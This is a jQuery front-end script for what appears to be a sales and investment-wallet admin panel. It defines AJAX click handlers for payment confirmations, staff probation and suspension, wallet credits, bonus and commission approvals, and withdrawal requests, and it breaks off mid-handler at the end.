//07-04-2020

	$('.payment_reminder').click(function(e){
	e.preventDefault();
	$.ajax({
  url:"ajax_admin/payment_reminder.php",
  method:"POST",
  data: $('#payment_reminder_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Payment Reminder has been set successfully"
		});
		setTimeout( function(){ window.location.href = "payment_reminder";}, 4000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	  else if(data == 'record_exists'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exist"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in setting payment reminder"
		});
	 }
		
  }
  });
});


$('.confirm_payment').click(function(e){
	e.preventDefault();
	$.ajax({
  url:"ajax_admin/confirm_payment.php",
  method:"POST",
  data: $('#confirm_payment_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Payment Confirmation request has been sent successfully"
		});
		setTimeout( function(){ window.location.href = "confirm_payment";}, 4000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in requesting payment confirmation"
		});
	 }
		
  }
  });
});

$('.request_invoice').click(function(e){
	e.preventDefault();
	$.ajax({
  url:"ajax_admin/request_invoice.php",
  method:"POST",
  data: $('#request_invoice_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Invoice request has been sent successfully"
		});
		setTimeout( function(){ window.location.href = "request_invoice";}, 4000);
	 }
	 else if(data == 'empty_fields'){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in requesting invoice"
		});
	 }
		
  }
  });
});


//14-04-2020
$('.sack_be').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/sack_be.php",
  method:"POST",
  data:$('#sack_be_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Business Executive sack request has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "my_be";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending request"
		});
	 }
		
  }
  });
});

$('.suspend_be').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/suspend_be.php",
  method:"POST",
  data:$('#suspend_be_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Business Executive suspension request has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "my_be";}, 4000);
	 }	

	  else if(data == "empty_fields"){
	 		$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field (s) found"
		});
	 }
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending request"
		});
	 }
		
  }
  });
});


$('.reactivate_be').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reactivate_be.php",
  method:"POST",
  data:$('#reactivate_be_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Business Executive has been activated successfully"
		});
	 	setTimeout( function(){ window.location.href = "my_be";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in reactivaating BE"
		});
	 }
		
  }
  });
});


//21-04-2020
$('.place_probation').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/place_on_probation.php",
  method:"POST",
  data:$('#place_probation_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Business Executive has been placed on probation successfully"
		});
	 	setTimeout( function(){ window.location.href = "probation";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
		});
	 }
		
  }
  });
});


$('.remove_probation').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/remove_probation.php",
  method:"POST",
  data:$('#remove_probation_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Business Executive has been removed from probation successfully"
		});
	 	setTimeout( function(){ window.location.href = "probation";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
		});
	 }
		
  }
  });
});


$('#set_target').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/set_target.php",
  method:"POST",
  data:$('#set_target_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Target has been set successfully"
		});
	 	setTimeout( function(){ window.location.href = "set_target";}, 4000);
	 }

    else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error! Empty field found"
		});
	 }

	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Target has already been set, Please update instead"
		});
	 }
	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in setting target!"
		});
	 }
		
  }
  });
});


$('#set_probation_target').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/probation_target.php",
  method:"POST",
  data:$('#set_probation_target_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Target has been set successfully"
		});
	 	setTimeout( function(){ window.location.href = "probation_target";}, 4000);
	 }

	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record Alrreay Exists, Please update instead"
		});
	 }
	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in setting target!"
		});
	 }
		
  }
  });
});


$('.edit_individual_target').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_individual_target.php",
  method:"POST",
  data:$('#edit_individual_target_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request to edit individual target has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "adjust_target";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in making request!"
		});
	 }
		
  }
  });
});


$('.edit_probation_target').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_probation_target.php",
  method:"POST",
  data:$('#edit_probation_target_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Probation target has been reset successfully"
		});
	 	setTimeout( function(){ window.location.href = "adjust_target";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in reseting probation target!"
		});
	 }
		
  }
  });
});


//30-04-2020

$('.approve_sales').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_sales.php",
  method:"POST",
  data:$('#approve_sales_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Sale has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "sales_approval";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving sales!"
		});
	 }
		
  }
  });
});


$('.approve_transfer_client_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_transfer_client_request.php",
  method:"POST",
  data:$('#approve_transfer_client_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Client(s) transfer request has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "client_transfer_approval";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving client transfer request!"
		});
	 }
		
  }
  });
});


$('.reject_transfer_client_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_transfer_client_request.php",
  method:"POST",
  data:$('#reject_transfer_client_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Client(s) transfer request has been rejected successfully"
		});
	 	setTimeout( function(){ window.location.href = "client_transfer_approval";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting client transfer request!"
		});
	 }
		
  }
  });
});

//08-05-2020
$('.approve_payment').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_payment.php",
  method:"POST",
  data:$('#approve_payment_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Payment has been confirmed successfully"
		});
	 	setTimeout( function(){ window.location.href = "payment_confirmation";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in confirming payment!"
		});
	 }
		
  }
  });
});

$('.reject_payment').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_payment.php",
  method:"POST",
  data:$('#reject_payment_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Payment has been rejected successfully"
		});
	 	setTimeout( function(){ window.location.href = "payment_confirmation";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting payment!"
		});
	 }
		
  }
  });
});


//12-06-2020
$('#credit_investor_wallet').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/credit_user_wallet.php",
  method:"POST",
  data:$('#credit_investor_wallet_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User's wallet has been credited successfully"
		});
	 	setTimeout( function(){ window.location.href = "accountant_wallet";}, 4000);
	 }	

	  else if(data == "empty_fields"){
	 		$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }	

	  else if(data == "balance_less"){
	 		$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Insufficient Balance!"
		});
	 }

	 else if(data == "get_wallet_balance_error"){
	 		$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Erro in getting wallet balance!"
		});
	 }
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
		});
	 }
		
  }
  });
});

$('.error_credit').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
//alert(id);
$.ajax({
  url:"ajax_admin/error_credit.php",
  method:"POST",
  data:$('#error_credit_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Credit has been successfully marked as error"
		});
	 	setTimeout( function(){ window.location.href = "credit_user_wallet_log";}, 4000);
	 }
	 
	 else if(data == "user_balance_less"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error! User's wallet balance is not enough. Please try again later"
		});
	 }
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
		});
	 }
		
  }
  });
});


$('#save_draft').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/save_agreement_draft.php",
  method:"POST",
  data:$('#save_draft_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Agreement Draft has been saved successfully"
		});
	 	setTimeout( function(){ window.location.href = "draft_agreement";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error!"
		});
	 }
		
  }
  });
});

//28-05-2020

$('.deactivate_wallet').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/deactivate_wallet.php",
  method:"POST",
  data:$('#deactivate_wallet_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User's wallet has been deactivated successfully"
		});
	 	setTimeout( function(){ window.location.href = "deactivate_wallet";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in deactivating user's wallet!"
		});
	 }
		
  }
  });
});

//01-05-2020
$('.reactivate_wallet').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reactivate_wallet.php",
  method:"POST",
  data:$('#reactivate_wallet_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User's wallet has been reactivated successfully"
		});
	 	setTimeout( function(){ window.location.href = "deactivate_wallet";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in reactivating user's wallet!"
		});
	 }
		
  }
  });
});

$('#request_funds').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/request_funds.php",
  method:"POST",
  data:$('#request_funds_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Funds request has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "request_funds";}, 4000);
	 }	
	 
	  else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending request!"
		});
	 }
		
  }
  });
});

$('#set_bonus_commission').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/set_bonus_commission.php",
  method:"POST",
  data:$('#set_bonus_commission_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request to set Bonus/Commission has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "set_bonus_commission";}, 4000);
	 }
	  else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }	

	 else if(data == "no_target_found"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Please set monthly target first"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending request!"
		});
	 }
		
  }
  });
});

$('.approve_bonus_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_bonus_request.php",
  method:"POST",
  data:$('#approve_bonus_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Bonus request has been approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_bonus_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 	//setTimeout( function(){ window.location.href = "bonus_request";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving Bonus request!"
		});
	 }
		
  }
  });
});

$('.reject_bonus_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_bonus_request.php",
  method:"POST",
  data:$('#reject_bonus_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Bonus request has been rejected successfully"
		});
	 	$('.reject_modal').modal("hide");
		$('#reject_bonus_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
	 	//setTimeout( function(){ window.location.href = "bonus_request";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting Bonus request!"
		});
	 }
		
  }
  });
});



$('.approve_commission_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_commission_request.php",
  method:"POST",
  data:$('#approve_commission_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Commission request has been approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_commission_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 	//setTimeout( function(){ window.location.href = "commission_request";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving Commission request!"
		});
	 }
		
  }
  });
});

$('.reject_commission_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_commission_request.php",
  method:"POST",
  data:$('#reject_commission_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Commission request has been rejected successfully"
		});
	 	$('.reject_modal').modal("hide");
		$('#reject_commission_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
	 	//setTimeout( function(){ window.location.href = "bonus_request";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting Commission request!"
		});
	 }
		
  }
  });
});

$('.approve_bonus_claim').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_bonus_claim.php",
  method:"POST",
  data:$('#approve_bonus_claim_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Bonus Claim has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "bonus_claim";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving Bonus Claim!"
		});
	 }
		
  }
  });
});

$('.reject_bonus_claim').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_bonus_claim.php",
  method:"POST",
  data:$('#reject_bonus_claim_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Bonus Claim has been rejected successfully"
		});
	 	setTimeout( function(){ window.location.href = "bonus_claim";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting Bonus Claim!"
		});
	 }
		
  }
  });
});

$('.query_bonus_claim').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/query_bonus_claim.php",
  method:"POST",
  data:$('#query_bonus_claim_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Bonus Claim has been queried"
		});
	 	setTimeout( function(){ window.location.href = "bonus_claim";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in querying Bonus Claim!"
		});
	 }
		
  }
  });
});


$('.approve_commission_claim').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_commission_claim.php",
  method:"POST",
  data:$('#approve_commission_claim_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Commission Claim has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "commission_claim";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving commission Claim!"
		});
	 }
		
  }
  });
});

$('.reject_commission_claim').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_commission_claim.php",
  method:"POST",
  data:$('#reject_commission_claim_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Commission Claim has been rejected successfully"
		});
	 	setTimeout( function(){ window.location.href = "commission_claim";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting commission Claim!"
		});
	 }
		
  }
  });
});

$('.query_commission_claim').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/query_commission_claim.php",
  method:"POST",
  data:$('#query_commission_claim_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Commission Claim has been queried"
		});
	 	setTimeout( function(){ window.location.href = "commission_claim";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in querying commission Claim!"
		});
	 }
		
  }
  });
});


$('.sales_claim').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/sales_claim.php",
  method:"POST",
  data:$('#sales_claim_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Sales has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "sales_claim";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving Sales!"
		});
	 }
		
  }
  });
});


$('.approve_withdrawal_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/accountant_approve_withdrawal_request.php",
  method:"POST",
  data:$('#accountant_withdrawal_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal Request has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "accountant_withdrawal_request";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving Withdrawal Request!"
		});
	 }
		
  }
  });
});

$('.reject_withdrawal_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/accountant_reject_withdrawal_request.php",
  method:"POST",
  data:$('#accountant_withdrawal_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal Request has been rejected successfully"
		});
	 	setTimeout( function(){ window.location.href = "accountant_withdrawal_request";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting Withdrawal Request!"
		});
	 }
		
  }
  });
});


$('.resolve_invoice_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/resolve_invoice_request.php",
  method:"POST",
  data:$('#resolve_invoice_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Invoice Request has been resolved successfully"
		});
	 	setTimeout( function(){ window.location.href = "invoice_request";}, 4000);
	 }	
	 
	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in resolving Invoice Request!"
		});
	 }
		
  }
  });
});

$('#log_online_payment').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/log_online_payment.php",
  method:"POST",
  data:$('#log_online_payment_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Payment has been logged successfully"
		});
	 	setTimeout( function(){ window.location.href = "log_payment";}, 4000);
	 }	
	 
	  else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in logging payment!"
		});
	 }
		
  }
  });
});


$('#debit_account').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/debit_account.php",
  method:"POST",
